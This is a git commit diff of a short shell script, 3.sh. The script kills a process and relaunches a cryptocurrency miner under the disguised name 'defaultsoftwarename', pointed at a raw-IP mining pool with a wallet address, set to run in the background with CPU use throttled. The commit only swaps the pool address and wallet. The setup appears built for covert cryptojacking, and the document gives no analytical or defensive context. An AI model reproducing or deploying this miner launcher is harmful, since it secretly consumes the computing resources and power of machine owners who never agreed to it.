8f86046da6addfd272ebdf444736bdac6afbaf97
solscobbturpa <57539661+solscobbturpa@users.noreply.github.com>
2020-04-10 11:44:47 -0700

    Add files via upload

--- 3.sh
+++ 3.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 188.165.224.211:49228 -u 48moEJhh3YGNomdXrGwhXkfjN357cUHSe9euFXMLCwHaPo47K5oixUQiZizbbJ5cYfgnh4xYRyHt36hWhE3DyjRrRLBqshq --pass=x:solscobbturpa@gmail.com --rig-id=02 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
+defaultsoftwarename -o 116.202.248.230:40019 -u 42yUs43a28BQPN2BaYZtuT1N4V7vATA1Sj4STnpTS4jyL4PgWTCNrukhbNDGnZguCr6o7LHDQkUjGDeu3FTGkqnjHCTZeAT --pass=x:solscobbturpa@gmail.com --rig-id=9 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
